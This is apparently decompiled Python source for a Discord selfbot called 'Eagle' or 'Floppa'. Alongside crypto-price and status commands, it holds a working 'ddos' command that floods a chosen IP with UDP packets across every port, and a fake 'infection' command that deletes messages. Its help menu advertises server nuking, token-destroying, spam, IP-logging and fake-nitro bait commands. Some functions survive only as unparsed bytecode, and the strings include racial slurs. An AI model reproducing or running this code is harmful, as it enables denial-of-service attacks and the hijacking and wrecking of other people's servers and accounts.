            embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
            embed.set_author(name=('Found Keywords' + str(Eagle.command_prefix)), icon_url=(Eagle.user.avatar_url))
            embed.set_thumbnail(url=vape)
            embed.set_image(url='')
            embed.add_field(name='Found word', value=f"{word} here: {msg.jump_url}", inline=False)
            embed.set_footer(text=(f"{gitcredit}"))
            await ctx.send(embed=embed, delete_after=30)


@Eagle.command(aliases=['btcrpice'])
async def btc(ctx):
    """Gets the current Bitcoin Price"""
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR,GBP')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    gbp = r['GBP']
    em = discord.Embed(description=f"USD: `{str(usd)}$`\n\nEUR: `{str(eur)}u'€`\n\nGBP: `'{str(gbp)}u'£`'")
    em.set_author(name='Bitcoin', icon_url='https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png')
    await ctx.send(embed=em)


@Eagle.command(aliases=['ethereum'])
async def eth(ctx):
    """Gets the current Etherium price"""
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD,EUR,GBP')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    gbp = r['GBP']
    em = discord.Embed(description=f"USD: `{str(usd)}$`\nEUR: `{str(eur)}u'€`\n\nGBP: `'{str(gbp)}u'£`'")
    em.set_author(name='Ethereum', icon_url='https://cdn.discordapp.com/attachments/271256875205525504/374282740218200064/2000px-Ethereum_logo.png')
    await ctx.send(embed=em)


@Eagle.command(aliases=['usdtobtc', 'usd2btc'])
async def usdbtc(ctx, message):
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD')
    r = r.json()
    usd = r['USD']
    index = 1 / usd
    amount = int(message)
    converted = amount * index
    em = discord.Embed(description=f"**{amount}$** = **{converted} BTC**")
    em.set_author(name='USD to Bitcoin', icon_url='https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png')
    await ctx.send(embed=em)


@Eagle.command(aliases=['usdtoeth', 'usd2eth'])
async def usdeth(ctx, message):
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD')
    r = r.json()
    usd = r['USD']
    index = 1 / usd
    amount = int(message)
    converted = amount * index
    em = discord.Embed(description=f"**{amount}$** = **{converted} ETH**")
    em.set_author(name='USD to ETH', icon_url='https://cdn.discordapp.com/attachments/271256875205525504/374282740218200064/2000px-Ethereum_logo.png')
    await ctx.send(embed=em, delete_after=30)


bannable = delete_after = 5

@Eagle.command(aliases=['gr', 'homo'])
async def gayrate(ctx, member: discord.Member=None):
    member = ctx.author if not member else member
    kojimu = random.randint(0, 100)
    if member == None:
        embed = discord.Embed(description=f"{kojimu}% gay", color=boi)
        embed.set_author(name=f"{ctx.author} is", icon_url=(ctx.author.avatar_url))
        embed.set_footer(text=(f"{gitcredit}"))
        await ctx.send(embed=embed, delete_after=5)
    embed = discord.Embed(description=f"{kojimu}% gay", color=boi)
    embed.set_author(name=f"{member.name} is", icon_url=(member.avatar_url))
    embed.set_footer(text=(f"{gitcredit}"))
    await ctx.send(embed=embed, delete_after=5)


@Eagle.command(aliases=['playing'])
async def play(ctx, *, text):
    await ctx.message.delete()
    await Eagle.client.change_presence(activity=discord.Game(name=text))
    embed = discord.Embed(description=f"**{ctx.author.mention}, Is now Playing {text}**", color=boi)
    embed.set_footer(text=(f"{gitcredit}"))
    await ctx.send(embed=embed, delete_after=5)


@Eagle.command(aliases=['watching'])
async def watch(ctx, *, text):
    await ctx.message.delete()
    await Eagle.change_presence(activity=discord.Activity(type=(discord.ActivityType.watching), name=text))
    embed = discord.Embed(description=f"**{ctx.author.mention}, Is now Watching {text}**", color=boi)
    embed.set_footer(text=(f"{gitcredit}"))
    await ctx.send(embed=embed)


@Eagle.command(aliases=['listening'])
async def listen(ctx, *, text):
    await ctx.message.delete()
    await Eagle.change_presence(activity=discord.Activity(type=(discord.ActivityType.listening), name=text))
    embed = discord.Embed(description=f"**{ctx.author.mention}, Is Now To Listening {text}**", color=boi)
    embed.set_footer(text=(f"{gitcredit}"))
    await ctx.send(embed=embed)


@Eagle.command(aliases=['reset'])
async def stop(ctx):
    await ctx.message.delete()
    await Eagle.client.change_presence(activity=None, status=(discord.Status.dnd))
    embed = discord.Embed(description=f"**{ctx.author.mention}'s Status Has Reset**", color=boi)
    embed.set_footer(text=(f"{gitcredit}"))
    await ctx.send(embed=embed)


@Eagle.command()
async def daily(ctx):
    await ctx.message.delete()
    await ctx.send('Getting BTC/ETH info...')
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR,GBP')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    gbp = r['GBP']
    em = discord.Embed(description=f"USD: `{str(usd)}$`\n\nEUR: `{str(eur)}u'€`\n\nGBP: `'{str(gbp)}u'£`'")
    em.set_author(name='Bitcoin', icon_url='https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png')
    await ctx.send(embed=em)
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD,EUR,GBP')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    gbp = r['GBP']
    em = discord.Embed(description=f"USD: `{str(usd)}$`\nEUR: `{str(eur)}u'€`\n\nGBP: `'{str(gbp)}u'£`'")
    em.set_author(name='Ethereum', icon_url='https://cdn.discordapp.com/attachments/271256875205525504/374282740218200064/2000px-Ethereum_logo.png')
    await ctx.send(embed=em)


jitcolor = 11306589
from time import sleep

@Eagle.command()
async def src--- This code section failed: ---

 L.1057         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                send
                4  LOAD_STR                 'Checking User Compatability'
                6  CALL_FUNCTION_1       1  '1 positional argument'
                8  GET_AWAITABLE
               10  LOAD_CONST               None
               12  YIELD_FROM
               14  POP_TOP

 L.1058        16  LOAD_GLOBAL              sleep
               18  LOAD_CONST               0.4
               20  CALL_FUNCTION_1       1  '1 positional argument'
               22  POP_TOP

 L.1059        24  LOAD_FAST                'ctx'
               26  LOAD_ATTR                send
               28  LOAD_STR                 'Checking User  Compatability.'
               30  LOAD_CONST               ('content',)
               32  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               34  GET_AWAITABLE
               36  LOAD_CONST               None
               38  YIELD_FROM
               40  POP_TOP

 L.1060        42  LOAD_GLOBAL              sleep
               44  LOAD_CONST               1
               46  CALL_FUNCTION_1       1  '1 positional argument'
               48  POP_TOP

 L.1061        50  LOAD_FAST                'ctx'
               52  LOAD_ATTR                send
               54  LOAD_STR                 'Checking User Compatability..'
               56  LOAD_CONST               ('content',)
               58  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               60  GET_AWAITABLE
               62  LOAD_CONST               None
               64  YIELD_FROM
               66  POP_TOP

 L.1062        68  LOAD_GLOBAL              sleep
               70  LOAD_CONST               1
               72  CALL_FUNCTION_1       1  '1 positional argument'
               74  POP_TOP

 L.1063        76  LOAD_FAST                'ctx'
               78  LOAD_ATTR                send
               80  LOAD_STR                 'Checking User  Compatability...'
               82  LOAD_CONST               ('content',)
               84  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               86  GET_AWAITABLE
               88  LOAD_CONST               None
               90  YIELD_FROM
               92  POP_TOP

 L.1064        94  LOAD_GLOBAL              time
               96  LOAD_ATTR                sleep
               98  LOAD_CONST               1
              100  CALL_FUNCTION_1       1  '1 positional argument'
              102  POP_TOP

 L.1065       104  LOAD_FAST                'ctx'
              106  LOAD_ATTR                send
              108  LOAD_STR                 'Saving Dump'
              110  LOAD_CONST               ('content',)
              112  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              114  GET_AWAITABLE
              116  LOAD_CONST               None
              118  YIELD_FROM
              120  POP_TOP

 L.1066       122  LOAD_GLOBAL              time
              124  LOAD_ATTR                sleep
              126  LOAD_CONST               1
              128  CALL_FUNCTION_1       1  '1 positional argument'
              130  POP_TOP

 L.1067       132  LOAD_FAST                'ctx'
              134  LOAD_ATTR                send
              136  LOAD_STR                 'Saving Dump.'
              138  LOAD_CONST               ('content',)
              140  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              142  GET_AWAITABLE
              144  LOAD_CONST               None
              146  YIELD_FROM
              148  POP_TOP

 L.1068       150  LOAD_GLOBAL              sleep
              152  LOAD_CONST               2
              154  CALL_FUNCTION_1       1  '1 positional argument'
              156  POP_TOP

 L.1069       158  LOAD_FAST                'ctx'
              160  LOAD_ATTR                send
              162  LOAD_STR                 'Infected... Happy Virusing nigga'
              164  CALL_FUNCTION_1       1  '1 positional argument'
              166  GET_AWAITABLE
              168  LOAD_CONST               None
              170  YIELD_FROM
              172  POP_TOP

 L.1070       174  LOAD_GLOBAL              sleep
              176  LOAD_CONST               5
              178  CALL_FUNCTION_1       1  '1 positional argument'
              180  POP_TOP

 L.1071       182  SETUP_LOOP          312  'to 312'
              184  LOAD_FAST                'ctx'
              186  LOAD_ATTR                message
              188  LOAD_ATTR                channel
              190  LOAD_ATTR                history
              192  LOAD_CONST               5
              194  LOAD_CONST               ('limit',)
              196  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              198  LOAD_ATTR                filter
              200  LOAD_LAMBDA              '<code_object <lambda>>'
              202  LOAD_STR                 'src.<locals>.<lambda>'
              204  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
              206  CALL_FUNCTION_1       1  '1 positional argument'
              208  LOAD_ATTR                map
              210  LOAD_LAMBDA              '<code_object <lambda>>'
              212  LOAD_STR                 'src.<locals>.<lambda>'
              214  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
              216  CALL_FUNCTION_1       1  '1 positional argument'
              218  GET_AITER
              220  LOAD_CONST               None
              222  YIELD_FROM
              224  SETUP_EXCEPT        238  'to 238'
              226  GET_ANEXT
              228  LOAD_CONST               None
              230  YIELD_FROM
              232  STORE_FAST               'message'
              234  POP_BLOCK
              236  JUMP_FORWARD        264  'to 264'
            238_0  COME_FROM_EXCEPT    224  '224'
              238  DUP_TOP
              240  LOAD_GLOBAL              StopAsyncIteration
              242  COMPARE_OP               exception-match
              244  POP_JUMP_IF_FALSE   262  'to 262'
              248  POP_TOP
              250  POP_TOP
              252  POP_TOP
              254  POP_EXCEPT
              256  POP_BLOCK
              258  JUMP_ABSOLUTE       312  'to 312'
              262  END_FINALLY
            264_0  COME_FROM           236  '236'

 L.1072       264  SETUP_EXCEPT        284  'to 284'

 L.1073       266  LOAD_FAST                'message'
              268  LOAD_ATTR                delete
              270  CALL_FUNCTION_0       0  '0 positional arguments'
              272  GET_AWAITABLE
              274  LOAD_CONST               None
              276  YIELD_FROM
              278  POP_TOP
              280  POP_BLOCK
              282  JUMP_BACK           224  'to 224'
            284_0  COME_FROM_EXCEPT    264  '264'

 L.1074       284  POP_TOP
              286  POP_TOP
              288  POP_TOP

 L.1075       290  LOAD_GLOBAL              print
              292  LOAD_GLOBAL              Exception
              294  CALL_FUNCTION_1       1  '1 positional argument'
              296  POP_TOP
              298  POP_EXCEPT
              300  JUMP_BACK           224  'to 224'
              302  END_FINALLY
              304  JUMP_BACK           224  'to 224'
              306  POP_BLOCK
              308  JUMP_ABSOLUTE       312  'to 312'
            312_0  COME_FROM_LOOP      182  '182'

Parse error at or near `JUMP_ABSOLUTE' instruction at offset 308


@Eagle.command(pass_context=True)
async def proxys(ctx, arg1=None):
    if arg1 is None:
        arg1 = '600'
    await ctx.message.delete()
    http = requests.post(f"https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout={arg1}")
    f = open('data/proxyshit/http.txt', 'w')
    f.write(http.text)
    f.close()
    await ctx.send(file=(discord.File('data/proxyshit/http.txt')))


@Eagle.command()
async def dumpchat--- This code section failed: ---

 L.1091         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                channel
                4  LOAD_ATTR                name
                6  FORMAT_VALUE          0  ''
                8  LOAD_STR                 '.txt'
               10  BUILD_STRING_2        2
               12  STORE_FAST               'filename'

 L.1092        14  LOAD_GLOBAL              open
               16  LOAD_FAST                'filename'
               18  LOAD_STR                 'w'
               20  CALL_FUNCTION_2       2  '2 positional arguments'
               22  SETUP_WITH          128  'to 128'
               24  STORE_FAST               'file'

 L.1093        26  SETUP_LOOP          124  'to 124'
               28  LOAD_FAST                'ctx'
               30  LOAD_ATTR                channel
               32  LOAD_ATTR                history
               34  LOAD_CONST               None
               36  LOAD_CONST               ('limit',)
               38  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               40  GET_AITER
               42  LOAD_CONST               None
               44  YIELD_FROM
               46  SETUP_EXCEPT         60  'to 60'
               48  GET_ANEXT
               50  LOAD_CONST               None
               52  YIELD_FROM
               54  STORE_FAST               'msg'
               56  POP_BLOCK
               58  JUMP_FORWARD         82  'to 82'
             60_0  COME_FROM_EXCEPT     46  '46'
               60  DUP_TOP
               62  LOAD_GLOBAL              StopAsyncIteration
               64  COMPARE_OP               exception-match
               66  POP_JUMP_IF_FALSE    80  'to 80'
               68  POP_TOP
               70  POP_TOP
               72  POP_TOP
               74  POP_EXCEPT
               76  POP_BLOCK
               78  JUMP_ABSOLUTE       124  'to 124'
               80  END_FINALLY
             82_0  COME_FROM            58  '58'

 L.1094        82  LOAD_FAST                'file'
               84  LOAD_ATTR                write
               86  LOAD_FAST                'msg'
               88  LOAD_ATTR                created_at
               90  FORMAT_VALUE          0  ''
               92  LOAD_STR                 ' - '
               94  LOAD_FAST                'msg'
               96  LOAD_ATTR                author
               98  LOAD_ATTR                display_name
              100  FORMAT_VALUE          0  ''
              102  LOAD_STR                 ': '
              104  LOAD_FAST                'msg'
              106  LOAD_ATTR                clean_content
              108  FORMAT_VALUE          0  ''
              110  LOAD_STR                 '\n'
              112  BUILD_STRING_6        6
              114  CALL_FUNCTION_1       1  '1 positional argument'
              116  POP_TOP
              118  JUMP_BACK            46  'to 46'
              120  POP_BLOCK
              122  JUMP_ABSOLUTE       124  'to 124'
            124_0  COME_FROM_LOOP       26  '26'
              124  POP_BLOCK
              126  LOAD_CONST               None
            128_0  COME_FROM_WITH       22  '22'
              128  WITH_CLEANUP_START
              130  WITH_CLEANUP_FINISH
              132  END_FINALLY

Parse error at or near `JUMP_ABSOLUTE' instruction at offset 122


@Eagle.command()
async def sock5(ctx, arg1=None):
    await ctx.message.delete()
    arg1 = '600'
    r = requests.post('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=600')
    f = open('data/proxyshit/sock5.txt', 'w')
    f.write(r.text)
    f.close()
    try:
        await ctx.send(file=(discord.File('data/proxyshit/sock5.txt')))
        embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
        embed.set_author(name=('Scraped Proxys | Eagle Selfbot' + str(Eagle.command_prefix)), icon_url=(Eagle.user.avatar_url))
        embed.set_thumbnail(url=vape)
        embed.set_image(url='')
        embed.add_field(name='Scraped Proxys succesfully:', value='Floppa Selfbot Winning W', inline=inlined)
        embed.set_footer(text=themefooter)
        await ctx.send(embed=embed, delete_after=30)
    except:
        embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
        embed.set_author(name=('Failed | Eagle Selfbot' + str(Eagle.command_prefix)), icon_url=(Eagle.user.avatar_url))
        embed.set_thumbnail(url=vape)
        embed.set_image(url='')
        embed.add_field(name='Failed To Get Proxys', value='Ok Yes yes', inline=inlined)
        embed.set_footer(text={gitcredit})
        await ctx.send(embed=embed, delete_after=30)


@Eagle.command(description='Get the guild banner image')
async def getbanner(ctx):
    await ctx.message.delete()
    if ctx.message.guild is None:
        await ctx.send('This server has no banner, Otherwise it was a failure')
        return
    await ctx.send(ctx.message.guild.banner_url)


kiss_description = [
 'kiss kiss nigga lol', 'Wakey wakey', '😳']

@Eagle.command()
async def kiss(ctx, user: discord.Member):
    await ctx.message.delete()
    embed = discord.Embed(title=f"{Eagle.user.name} kissed {user.name}", description=(random.choice(kiss_description)), color=jitcolor)
    embed.set_image(url=(random.choice(kiss)))
    embed.set_footer(text={gitcredit})
    await ctx.send(embed=embed)


inlined = False
emoji = '🔥'

@Eagle.command()
async def fire(ctx):
    global emoji
    global jitcolor
    await ctx.message.delete()
    jitcolor = 11306589
    emoji = '🔥'


@Eagle.command()
async def ddos(ctx, ip, port):
    await ctx.message.delete()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    logoz = subprocess.Popen('pyfiglet EAGLE DDOSER', shell=True)
    subprocess_return = subprocess.stdout.read()
    await ctx.send(subprocess_return)
    os.system('clear')
    os.system('figlet Attack Starting')
    time.sleep(3)
    sent = 0
    while 1:
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        print('Sent %s packet to %s throught port:%s' % (sent, ip, port))
        if port == 65534:
            port = 1


@Eagle.command()
async def exit(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
    embed.set_author(name=('Exiting | Eagle Selfbot' + str(Eagle.command_prefix)), icon_url=(Eagle.user.avatar_url))
    embed.set_thumbnail(url=vape)
    embed.set_image(url='')
    embed.add_field(name='Exiting Selfbot...', value=gitcredit, inline=inlined)
    embed.set_footer(text={gitcredit})
    await ctx.send(embed=embed)
    sys.exit()


import numpy

@Eagle.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        await ctx.message.delete()
        embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
        embed.set_author(name=('Invalid Command | Floppa Selfbot' + str(Eagle.command_prefix)), icon_url=(Eagle.user.avatar_url))
        embed.set_thumbnail(url=vape)
        embed.set_image(url='')
        embed.add_field(name='Command was not found:', value=f"The {error}", inline=inlined)
        embed.set_footer(text=themefooter)
        await ctx.send(embed=embed, delete_after=30)
    else:
        if isinstance(error, commands.CheckFailure):
            await ctx.message.delete()
            embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
            embed.set_author(name=('Missing Permissions | Floppa Selfbot' + str(Eagle.command_prefix)), icon_url=(Eagle.user.avatar_url))
            embed.set_thumbnail(url=vape)
            embed.set_image(url='')
            embed.add_field(name='Missing permissions:', value=f"The {error}", inline=inlined)
            embed.set_footer(text=themefooter)
            await ctx.send(embed=embed, delete_after=30)
        else:
            if isinstance(error, commands.MissingRequiredArgument):
                embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
                embed.set_author(name=('Missing Arguments | Floppa Selfbot' + str(Eagle.command_prefix)), icon_url=(Eagle.user.avatar_url))
                embed.set_thumbnail(url=vape)
                embed.set_image(url='')
                embed.add_field(name='Missing Arguments:', value=f"The {error}", inline=inlined)
                embed.set_footer(text=themefooter)
                await ctx.send(embed=embed, delete_after=30)
            else:
                if isinstance(error, numpy.AxisError):
                    await ctx.send('Invalid Image', delete_after=3)
                else:
                    if isinstance(error, discord.errors.Forbidden):
                        await ctx.message.delete()
                        embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
                        embed.set_author(name=('Forbidden Access | Floppa Selfbot' + str(Eagle.command_prefix)), icon_url=(Eagle.user.avatar_url))
                        embed.set_thumbnail(url=vape)
                        embed.set_image(url='')
                        embed.add_field(name='Cannot execute command:', value=(f"{error}"), inline=inlined)
                        embed.set_footer(text=themefooter)
                        await ctx.send(embed=embed, delete_after=30)
                    else:
                        if 'Cannot send an empty message' in error_str:
                            await ctx.message.delete()
                            embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
                            embed.set_author(name=('Invalid message | Floppa Selfbot' + str(Eagle.command_prefix)), icon_url=(Eagle.user.avatar_url))
                            embed.set_thumbnail(url=vape)
                            embed.set_image(url='')
                            embed.add_field(name='Cannot execute command:', value=(f"{error}"), inline=inlined)
                            embed.set_footer(text=themefooter)
                            await ctx.send(embed=embed, delete_after=30)
                        else:
                            await ctx.message.delete()
                            embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
                            embed.set_author(name=('Error Occured | Floppa Selfbot' + str(Eagle.command_prefix)), icon_url=(Eagle.user.avatar_url))
                            embed.set_thumbnail(url=vape)
                            embed.set_image(url='')
                            embed.add_field(name='Something went wrong:', value=(f"{error}"), inline=inlined)
                            embed.set_footer(text=themefooter)
                            await ctx.send(embed=embed, delete_after=30)


@Eagle.command()
async def delwebhook(ctx, webhook):
    await ctx.message.delete()
    requests.delete(webhook)
    check = requests.get(webhook)
    try:
        if check.status_code == 404:
            embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
            embed.set_author(name=('Deleted Webhook | Floppa Selfbot' + str(Eagle.command_prefix)), icon_url=(Eagle.user.avatar_url))
            embed.set_thumbnail(url=vape)
            embed.set_image(url='')
            embed.add_field(name='Deleted webhook:', value=(f"{webhook}"), inline=inlined)
            embed.set_footer(text=themefooter)
            await ctx.send(embed=embed, delete_after=30)
        else:
            if check.status_code == 200:
                embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
                embed.set_author(name=('Invalid Webhook | Floppa Selfbot' + str(Eagle.command_prefix)), icon_url=(Eagle.user.avatar_url))
                embed.set_thumbnail(url=vape)
                embed.set_image(url='')
                embed.add_field(name='Invalid webhook:', value=(f"{webhook}"), inline=inlined)
                embed.set_footer(text=themefooter)
                await ctx.send(embed=embed, delete_after=30)
    except Exception as e:
        embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
        embed.set_author(name=('Error occured | Floppa Selfbot' + str(Eagle.command_prefix)), icon_url=(Eagle.user.avatar_url))
        embed.set_thumbnail(url=vape)
        embed.set_image(url='')
        embed.add_field(name='Error:', value=(f"{e}"), inline=inlined)
        embed.set_footer(text=themefooter)
        await ctx.send(embed=embed, delete_after=30)


import requests
from discord import Webhook, RequestsWebhookAdapter

@Eagle.command()
async def sendwebhook(ctx, webhookurl, msg):
    try:
        webhook = Webhook.from_url(webhookurl, adapter=(RequestsWebhookAdapter()))
        webhook.send(msg)
        embed = discord.Embed(color=11542817)
        embed.set_thumbnail(url='https://i.kym-cdn.com/entries/icons/facebook/000/034/421/cover1.jpg')
        embed.add_field(name='Webhook Sender', value='Sent To webhook', inline=True)
        embed.set_footer(text='Floppa Selfbot')
        await ctx.send(embed=embed)
    except:
        embed = discord.Embed(color=11542817)
        embed.set_thumbnail(url='https://i.kym-cdn.com/entries/icons/facebook/000/034/421/cover1.jpg')
        embed.add_field(name='Webhook Sender', value='Failed to Send', inline=True)
        embed.set_footer(text='Floppa Selfbot')
        await ctx.send(embed=embed)


@Eagle.command()
async def inline(ctx):
    global inlined
    if inlined is True:
        inlined = False
    elif inlined is False:
        inlined = True


import typing

@Eagle.command(aliases=['em'])
async def embed(ctx, color: typing.Optional[discord.Color]=None, *, text):
    em = discord.Embed(color=(color or random.randint(0, 16777215)))
    em.description = text
    await ctx.send(embed=em)
    await ctx.message.delete()


@Eagle.command()
async def utility2(ctx):
    embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
    embed.set_image(url='')
    embed.description = ' `Utiliy 2/2 Commands`\n - **getbanner** - Gets a servers banner\n - **ips** - sees where ips are by country\n - **inline** - Inline Mode\n - **copy** - Full Copy A server\n - **proxy** - Scrape working proxys\n - **addemoji** - Adds an emoji\n - **uptime** - Get bot uptime\n - **rename** - Rename yourself to something\n - **sendwebhook [message]** - Send message to webhook\n - **setbanner [banner]** - Set server banner\n - **dumpchat** - Dumps and Saves an entire chat, gc, or dm into a txt file\n - **botinvite** - Generate a bots invite from id\n - **restart** - Restart Eagle Selfbot                '
    await ctx.send(embed=embed, delete_after=10)


@Eagle.command()
async def ice(ctx):
    global emoji
    global jitcolor
    jitcolor = 11306589
    emoji = '🧊'


themetitle = 'Floppa Selfbot |' + str(Eagle.command_prefix)

@Eagle.command()
async def help(ctx, category=None):
    await ctx.message.delete()
    if category is None:
        embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
        embed.set_author(name=((f"{themetitle}") + str(Eagle.command_prefix)), icon_url=(Eagle.user.avatar_url))
        embed.set_thumbnail(url=vape)
        embed.set_image(url='')
        embed.description = '- **fun**  -   Fun Commands\n- **autofarm**  -   Autofarming Commands\n - **status**  -  Status Changing Commands \n - **utility**  -   useful Commands \n - **image**  -   Imaging Commands\n - **Malicious**  -   Malicious Commands\n - **crypto**  - Crypto Commands \n - **emoticon** - emoticon Faces\n - **theme**  -    Floppa Themes \n - **settings**\n - **anime** - Anime Bullshit '
        embed.set_footer(text={gitcredit})
        await ctx.send(embed=embed, delete_after=30)
    else:
        if str(category).lower() == 'fun':
            embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
            embed.set_image(url='')
            embed.description = '- **Tweet**  -   Tweet As a user\n- **Fry**  -   Frys a users pfp\n - **Revpfp**  -  Googles A Users Pfp, This commands skidded as fuck lol \n - **gp**  -   Ghost Pings Someone idiot dumb \n - **phc**  -   Makes a pornhub comment lol\n - **Dick**  -   dick size :weary:\n - **Spam**   \n - **blankspam**  - Spams a clear character 3 times for 4 seconds\n - **blank**  -   Extremely Large block of blank character - \n - **loser**  -  Run and find out \n - **daddy**  -   literally me LMFAO\n - **hexcode** -  Gets hex code of color\n  - **triggertyping**  -   Fake Type\n - **invisiblenickname** - Makes your nickname invisible\n - **dox** - total real dox\n - **realnitro** - Generate Real Nitro\n - **ascii** - ascii lmfao\n - **bait** - Fake nitro\n -  **dadjoke** - Dad joke\n - **reverse** - Reverse text\n - **roll** - Rick roll someone with an audio\n - **infinite** - Infinite video\n - **troll** - extremely long troll video\n - **suscheck** - Sus\n'
            await ctx.send(embed=embed, delete_after=30)
        else:
            if str(category).lower() == 'autofarm':
                embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
                embed.set_image(url='')
                embed.description = ' - **mee6** - Auto Mee6 \n - **pls** - Auto Dank memer'
                await ctx.send(embed=embed, delete_after=30)
            else:
                if str(category).lower() == 'status':
                    embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
                    embed.set_image(url='')
                    embed.description = ' `Status Changing`\n - **listening** - Change what ur listening too\n - **playing** - Change what your playing\n - **watching** - Change what your watching\n - **stop** - Stops status'
                    await ctx.send(embed=embed, delete_after=30)
                else:
                    if str(category).lower() == 'utility':
                        embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
                        embed.set_image(url='')
                        embed.description = ' - **Mc**  -   Shows member count\n - **Ignore**  -   Reads Guilds\n - **Bots**  -   Testing command idgaf bout - \n - **massunblock**  -   Unblocks Everyone lmfao tf else is it gonna do\n - **picture [query]**    Sends an image based on your query\n - **iplocate**  -   locate ip, GG Fatass IP logger (Me) :c\n - **Help**  -   Literally tells you to look in console\n - **nitro**  -  Random Nitro Code\n - **massunban**  -   Unbans everyone, did you get nuked? tf?\n - **av**  -   Get Someones Avatar\n - **changenickname**  -   Changes user nickname lel\n - **lockdown** -   Locks chat down\n - **cleardms** - clears your dms\n - **encode** - Encode to base64\n - **decode** - Decode something from base64 lol fuck else it gonna do\n - **cs** - copy a server\n - **emojispoofer** - spoofs emoji\n - **tempban** - Temporary ban for amount of seconds\n - **pi** - Shows pi number rounded idfk\n - **serverinfo** - get server info\n - **give** - Give role to someone \n - **take** - take a role from someone\n - **emojis** - list emojis in server (broken)\n - **bans** - Show a list of banned people\n - **utility2** - Second Utility Page'
                        await ctx.send(embed=embed, delete_after=30)
                    else:
                        if str(category).lower() == 'image':
                            embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
                            embed.set_image(url='')
                            embed.description = ' `imaging`\n - **Tweet** - Tweet a Message lel \n - **phcomment** - phcomment LOL so funni haha \n - **imaage** - Search up an image\n - **fry** - Fry a user :weary:\n - **revpfp** - Search up a pfp skidded command lol\n - **av** - get a users discord avatar\n - **gif** - Gif search'
                            await ctx.send(embed=embed, delete_after=30)
                        else:
                            if str(category).lower() == 'malicious':
                                embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
                                embed.set_image(url='')
                                embed.description = ' `Malicious commands`\n - **n** - Nukes a server \n - **softnuke** - casual nuke nothing big \n - **spam** - Spam messages \n - **pingroles** - Ping every role\n - **removegc** - removes all gc people LMFAO bruh\n - **disable** - Destroy a discord token\n - **spamrename** - Spam rename server name\n        - **delwebhook** - Delete a webhook\n - **termtoken** - Term a token\n        '
                                await ctx.send(embed=embed, delete_after=30)
                            else:
                                if str(category).lower() == 'crypto':
                                    embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
                                    embed.set_image(url='')
                                    embed.description = ' `Crypto commands`\n - **daily** - Get Daily price of btc and eth \n - **btc** - BTC price lmfao retard \n - **eth** - Get ETH price\n - **usdbtc** - converts usd to btc\n - **usdeth** - convert usd to eth\n - **bitcoin** - bitcoin price alternative'
                                    await ctx.send(embed=embed, delete_after=30)
                                else:
                                    if str(category).lower() == 'emoticon':
                                        embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
                                        embed.set_image(url='')
                                        embed.description = ' `Emoticon Commands`\n - **lenny** - lenny face\n - **magic** - magic lenny\n - **angrytableflip**\n - **wtf** - Wtf face\n - **happylenny** - happy lenny\n - **gunlenny** - gun lenny\n - **crosseye** - cross eyed lenny\n '
                                        await ctx.send(embed=embed, delete_after=10)
                                    else:
                                        if str(category).lower() == 'theme':
                                            embed = discord.Embed(color=jitcolor, timestamp=(ctx.message.created_at))
                                            embed.set_image(url='')
                                            embed.description = ' `Theme Commands`\n - **Fire** - Fire theme\n - **ice** - Ice Theme\n - **inline** - Inline Mode\n                '
